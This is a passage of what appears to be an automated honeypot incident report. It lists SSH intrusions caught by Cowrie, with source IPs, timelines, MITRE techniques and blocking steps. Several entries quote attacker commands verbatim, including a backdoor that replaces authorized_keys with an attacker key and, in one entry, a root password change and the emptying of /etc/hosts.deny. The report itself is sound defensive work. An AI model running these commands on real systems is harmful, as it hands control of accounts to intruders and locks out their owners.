|---|---|
| `2026-09-21 13:48:54` | `cowrie.session.connect` |
| `2026-09-21 13:48:54` | `cowrie.client.version` |
| `2026-09-21 13:48:54` | `cowrie.client.kex` |
| `2026-09-21 13:48:56` | `cowrie.login.success` |
| `2026-09-21 13:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.255.254[.]163` to AbuseIPDB if not already reported
- [ ] Block `139.255.254[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53c507ff76ae

| Field | Detail |
|---|---|
| **Source IP** | `140.246.137[.]102` |
| **First Seen** | 2026-09-21 13:49 |
| **Last Seen** | 2026-09-21 13:53 |
| **Session Duration** | 259s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:49:39` | `cowrie.session.connect` |
| `2026-09-21 13:49:39` | `cowrie.client.version` |
| `2026-09-21 13:49:40` | `cowrie.client.kex` |
| `2026-09-21 13:49:41` | `cowrie.login.success` |
| `2026-09-21 13:49:42` | `cowrie.session.params` |
| `2026-09-21 13:49:42` | `cowrie.command.input` |
| `2026-09-21 13:49:42` | `cowrie.command.failed` |
| `2026-09-21 13:49:42` | `cowrie.log.closed` |
| `2026-09-21 13:49:43` | `cowrie.session.params` |
| `2026-09-21 13:49:43` | `cowrie.command.input` |
| `2026-09-21 13:53:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `140.246.137[.]102` to AbuseIPDB if not already reported
- [ ] Block `140.246.137[.]102` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cc4c2313e87b

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-09-21 13:51 |
| **Last Seen** | 2026-09-21 13:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:51:46` | `cowrie.session.connect` |
| `2026-09-21 13:51:46` | `cowrie.client.version` |
| `2026-09-21 13:51:46` | `cowrie.client.kex` |
| `2026-09-21 13:51:46` | `cowrie.login.success` |
| `2026-09-21 13:51:47` | `cowrie.session.params` |
| `2026-09-21 13:51:47` | `cowrie.command.input` |
| `2026-09-21 13:51:47` | `cowrie.command.failed` |
| `2026-09-21 13:51:47` | `cowrie.log.closed` |
| `2026-09-21 13:51:48` | `cowrie.session.params` |
| `2026-09-21 13:51:48` | `cowrie.command.input` |
| `2026-09-21 13:51:48` | `cowrie.session.file_download` |
| `2026-09-21 13:51:48` | `cowrie.log.closed` |
| `2026-09-21 13:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c0f4b70799d0

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-09-21 13:51 |
| **Last Seen** | 2026-09-21 13:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:51:48` | `cowrie.session.connect` |
| `2026-09-21 13:51:48` | `cowrie.client.version` |
| `2026-09-21 13:51:48` | `cowrie.client.kex` |
| `2026-09-21 13:51:49` | `cowrie.login.success` |
| `2026-09-21 13:51:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a03f5543c5a4

| Field | Detail |
|---|---|
| **Source IP** | `80.102.218[.]187` |
| **First Seen** | 2026-09-21 13:51 |
| **Last Seen** | 2026-09-21 13:51 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:51:49` | `cowrie.session.connect` |
| `2026-09-21 13:51:49` | `cowrie.client.version` |
| `2026-09-21 13:51:49` | `cowrie.client.kex` |
| `2026-09-21 13:51:50` | `cowrie.login.success` |
| `2026-09-21 13:51:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.102.218[.]187` to AbuseIPDB if not already reported
- [ ] Block `80.102.218[.]187` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8f624dcb561d

| Field | Detail |
|---|---|
| **Source IP** | `118.145.237[.]236` |
| **First Seen** | 2026-09-21 13:52 |
| **Last Seen** | 2026-09-21 13:57 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 13:52:27` | `cowrie.session.connect` |
| `2026-09-21 13:52:27` | `cowrie.client.version` |
| `2026-09-21 13:52:27` | `cowrie.client.kex` |
| `2026-09-21 13:52:28` | `cowrie.login.success` |
| `2026-09-21 13:57:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.145.237[.]236` to AbuseIPDB if not already reported
- [ ] Block `118.145.237[.]236` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c30d3190b57

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-09-21 14:19 |
| **Last Seen** | 2026-09-21 14:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:19:12` | `cowrie.session.connect` |
| `2026-09-21 14:19:12` | `cowrie.client.version` |
| `2026-09-21 14:19:13` | `cowrie.client.kex` |
| `2026-09-21 14:19:14` | `cowrie.login.success` |
| `2026-09-21 14:19:15` | `cowrie.session.params` |
| `2026-09-21 14:19:15` | `cowrie.command.input` |
| `2026-09-21 14:19:15` | `cowrie.command.failed` |
| `2026-09-21 14:19:16` | `cowrie.log.closed` |
| `2026-09-21 14:19:17` | `cowrie.session.params` |
| `2026-09-21 14:19:17` | `cowrie.command.input` |
| `2026-09-21 14:19:17` | `cowrie.session.file_download` |
| `2026-09-21 14:19:17` | `cowrie.log.closed` |
| `2026-09-21 14:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ec28ee40d8b

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-09-21 14:19 |
| **Last Seen** | 2026-09-21 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:19:17` | `cowrie.session.connect` |
| `2026-09-21 14:19:17` | `cowrie.client.version` |
| `2026-09-21 14:19:17` | `cowrie.client.kex` |
| `2026-09-21 14:19:18` | `cowrie.login.success` |
| `2026-09-21 14:19:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-15925a44ac8a

| Field | Detail |
|---|---|
| **Source IP** | `101.47.155[.]9` |
| **First Seen** | 2026-09-21 14:19 |
| **Last Seen** | 2026-09-21 14:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:19:19` | `cowrie.session.connect` |
| `2026-09-21 14:19:19` | `cowrie.client.version` |
| `2026-09-21 14:19:19` | `cowrie.client.kex` |
| `2026-09-21 14:19:21` | `cowrie.login.success` |
| `2026-09-21 14:19:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.47.155[.]9` to AbuseIPDB if not already reported
- [ ] Block `101.47.155[.]9` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a00b5db4d3ba

| Field | Detail |
|---|---|
| **Source IP** | `39.170.108[.]144` |
| **First Seen** | 2026-09-21 14:22 |
| **Last Seen** | 2026-09-21 14:22 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:22:35` | `cowrie.session.connect` |
| `2026-09-21 14:22:35` | `cowrie.client.version` |
| `2026-09-21 14:22:36` | `cowrie.client.kex` |
| `2026-09-21 14:22:37` | `cowrie.login.success` |
| `2026-09-21 14:22:38` | `cowrie.session.params` |
| `2026-09-21 14:22:38` | `cowrie.command.input` |
| `2026-09-21 14:22:38` | `cowrie.command.failed` |
| `2026-09-21 14:22:38` | `cowrie.log.closed` |
| `2026-09-21 14:22:39` | `cowrie.session.params` |
| `2026-09-21 14:22:39` | `cowrie.command.input` |
| `2026-09-21 14:22:39` | `cowrie.session.file_download` |
| `2026-09-21 14:22:39` | `cowrie.log.closed` |
| `2026-09-21 14:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.170.108[.]144` to AbuseIPDB if not already reported
- [ ] Block `39.170.108[.]144` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa6b8f7f6857

| Field | Detail |
|---|---|
| **Source IP** | `39.170.108[.]144` |
| **First Seen** | 2026-09-21 14:22 |
| **Last Seen** | 2026-09-21 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:22:40` | `cowrie.session.connect` |
| `2026-09-21 14:22:40` | `cowrie.client.version` |
| `2026-09-21 14:22:40` | `cowrie.client.kex` |
| `2026-09-21 14:22:41` | `cowrie.login.success` |
| `2026-09-21 14:22:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.170.108[.]144` to AbuseIPDB if not already reported
- [ ] Block `39.170.108[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e01353991c72

| Field | Detail |
|---|---|
| **Source IP** | `39.170.108[.]144` |
| **First Seen** | 2026-09-21 14:22 |
| **Last Seen** | 2026-09-21 14:22 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:22:41` | `cowrie.session.connect` |
| `2026-09-21 14:22:41` | `cowrie.client.version` |
| `2026-09-21 14:22:42` | `cowrie.client.kex` |
| `2026-09-21 14:22:42` | `cowrie.login.success` |
| `2026-09-21 14:22:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `39.170.108[.]144` to AbuseIPDB if not already reported
- [ ] Block `39.170.108[.]144` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-acc267ec9984

| Field | Detail |
|---|---|
| **Source IP** | `14.103.83[.]214` |
| **First Seen** | 2026-09-21 14:23 |
| **Last Seen** | 2026-09-21 14:23 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:23:07` | `cowrie.session.connect` |
| `2026-09-21 14:23:07` | `cowrie.client.version` |
| `2026-09-21 14:23:07` | `cowrie.client.kex` |
| `2026-09-21 14:23:08` | `cowrie.login.success` |
| `2026-09-21 14:23:09` | `cowrie.session.params` |
| `2026-09-21 14:23:09` | `cowrie.command.input` |
| `2026-09-21 14:23:09` | `cowrie.command.failed` |
| `2026-09-21 14:23:10` | `cowrie.log.closed` |
| `2026-09-21 14:23:10` | `cowrie.session.params` |
| `2026-09-21 14:23:10` | `cowrie.command.input` |
| `2026-09-21 14:23:11` | `cowrie.session.file_download` |
| `2026-09-21 14:23:11` | `cowrie.log.closed` |
| `2026-09-21 14:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.83[.]214` to AbuseIPDB if not already reported
- [ ] Block `14.103.83[.]214` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1ef616d68808

| Field | Detail |
|---|---|
| **Source IP** | `14.103.83[.]214` |
| **First Seen** | 2026-09-21 14:23 |
| **Last Seen** | 2026-09-21 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:23:11` | `cowrie.session.connect` |
| `2026-09-21 14:23:11` | `cowrie.client.version` |
| `2026-09-21 14:23:11` | `cowrie.client.kex` |
| `2026-09-21 14:23:12` | `cowrie.login.success` |
| `2026-09-21 14:23:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.83[.]214` to AbuseIPDB if not already reported
- [ ] Block `14.103.83[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-86f4482f76df

| Field | Detail |
|---|---|
| **Source IP** | `14.103.83[.]214` |
| **First Seen** | 2026-09-21 14:23 |
| **Last Seen** | 2026-09-21 14:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:23:12` | `cowrie.session.connect` |
| `2026-09-21 14:23:12` | `cowrie.client.version` |
| `2026-09-21 14:23:13` | `cowrie.client.kex` |
| `2026-09-21 14:23:13` | `cowrie.login.success` |
| `2026-09-21 14:23:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.103.83[.]214` to AbuseIPDB if not already reported
- [ ] Block `14.103.83[.]214` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-489738055bd5

| Field | Detail |
|---|---|
| **Source IP** | `49.207.244[.]133` |
| **First Seen** | 2026-09-21 14:24 |
| **Last Seen** | 2026-09-21 14:25 |
| **Session Duration** | 22s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:XX0WpP2i3Bl4"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:24:56` | `cowrie.session.connect` |
| `2026-09-21 14:24:56` | `cowrie.client.version` |
| `2026-09-21 14:24:56` | `cowrie.client.kex` |
| `2026-09-21 14:24:57` | `cowrie.login.success` |
| `2026-09-21 14:24:58` | `cowrie.session.params` |
| `2026-09-21 14:24:58` | `cowrie.command.input` |
| `2026-09-21 14:24:58` | `cowrie.command.failed` |
| `2026-09-21 14:24:59` | `cowrie.log.closed` |
| `2026-09-21 14:25:00` | `cowrie.session.params` |
| `2026-09-21 14:25:00` | `cowrie.command.input` |
| `2026-09-21 14:25:00` | `cowrie.session.file_download` |
| `2026-09-21 14:25:00` | `cowrie.log.closed` |
| `2026-09-21 14:25:01` | `cowrie.session.params` |
| `2026-09-21 14:25:01` | `cowrie.command.input` |
| `2026-09-21 14:25:01` | `cowrie.log.closed` |
| `2026-09-21 14:25:02` | `cowrie.session.params` |
| `2026-09-21 14:25:02` | `cowrie.command.input` |
| `2026-09-21 14:25:02` | `cowrie.log.closed` |
| `2026-09-21 14:25:03` | `cowrie.session.params` |
| `2026-09-21 14:25:03` | `cowrie.command.input` |
| `2026-09-21 14:25:03` | `cowrie.session.file_download` |
| `2026-09-21 14:25:03` | `cowrie.log.closed` |
| `2026-09-21 14:25:04` | `cowrie.session.params` |
| `2026-09-21 14:25:04` | `cowrie.command.input` |
| `2026-09-21 14:25:05` | `cowrie.log.closed` |
| `2026-09-21 14:25:06` | `cowrie.session.params` |
| `2026-09-21 14:25:06` | `cowrie.command.input` |
| `2026-09-21 14:25:06` | `cowrie.log.closed` |
| `2026-09-21 14:25:07` | `cowrie.session.params` |
| `2026-09-21 14:25:07` | `cowrie.command.input` |
| `2026-09-21 14:25:07` | `cowrie.command.input` |
| `2026-09-21 14:25:07` | `cowrie.log.closed` |
| `2026-09-21 14:25:08` | `cowrie.session.params` |
| `2026-09-21 14:25:08` | `cowrie.command.input` |
| `2026-09-21 14:25:08` | `cowrie.log.closed` |
| `2026-09-21 14:25:09` | `cowrie.session.params` |
| `2026-09-21 14:25:09` | `cowrie.command.input` |
| `2026-09-21 14:25:10` | `cowrie.log.closed` |
| `2026-09-21 14:25:10` | `cowrie.session.params` |
| `2026-09-21 14:25:10` | `cowrie.command.input` |
| `2026-09-21 14:25:11` | `cowrie.log.closed` |
| `2026-09-21 14:25:11` | `cowrie.session.params` |
| `2026-09-21 14:25:11` | `cowrie.command.input` |
| `2026-09-21 14:25:12` | `cowrie.log.closed` |
| `2026-09-21 14:25:12` | `cowrie.session.params` |
| `2026-09-21 14:25:12` | `cowrie.command.input` |
| `2026-09-21 14:25:13` | `cowrie.log.closed` |
| `2026-09-21 14:25:14` | `cowrie.session.params` |
| `2026-09-21 14:25:14` | `cowrie.command.input` |
| `2026-09-21 14:25:14` | `cowrie.log.closed` |
| `2026-09-21 14:25:15` | `cowrie.session.params` |
| `2026-09-21 14:25:15` | `cowrie.command.input` |
| `2026-09-21 14:25:15` | `cowrie.log.closed` |
| `2026-09-21 14:25:16` | `cowrie.session.params` |
| `2026-09-21 14:25:16` | `cowrie.command.input` |
| `2026-09-21 14:25:16` | `cowrie.log.closed` |
| `2026-09-21 14:25:17` | `cowrie.session.params` |
| `2026-09-21 14:25:17` | `cowrie.command.input` |
| `2026-09-21 14:25:18` | `cowrie.log.closed` |
| `2026-09-21 14:25:18` | `cowrie.session.params` |
| `2026-09-21 14:25:18` | `cowrie.command.input` |
| `2026-09-21 14:25:19` | `cowrie.log.closed` |
| `2026-09-21 14:25:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `49.207.244[.]133` to AbuseIPDB if not already reported
- [ ] Block `49.207.244[.]133` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ee90bd652701

| Field | Detail |
|---|---|
| **Source IP** | `146.190.175[.]10` |
| **First Seen** | 2026-09-21 14:31 |
| **Last Seen** | 2026-09-21 14:31 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-21 14:31:39` | `cowrie.session.connect` |
| `2026-09-21 14:31:39` | `cowrie.client.version` |
| `2026-09-21 14:31:39` | `cowrie.client.kex` |
| `2026-09-21 14:31:40` | `cowrie.login.success` |
| `2026-09-21 14:31:40` | `cowrie.session.params` |
| `2026-09-21 14:31:40` | `cowrie.command.input` |
| `2026-09-21 14:31:40` | `cowrie.command.failed` |
| `2026-09-21 14:31:40` | `cowrie.log.closed` |
| `2026-09-21 14:31:41` | `cowrie.session.params` |
| `2026-09-21 14:31:41` | `cowrie.command.input` |
| `2026-09-21 14:31:41` | `cowrie.session.file_download` |
| `2026-09-21 14:31:41` | `cowrie.log.closed` |
| `2026-09-21 14:31:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `146.190.175[.]10` to AbuseIPDB if not already reported
- [ ] Block `146.190.175[.]10` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dda5ebdf086

| Field | Detail |
|---|---|
| **Source IP** | `146.190.175[.]10` |
| **First Seen** | 2026-09-21 14:31 |
| **Last Seen** | 2026-09-21 14:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
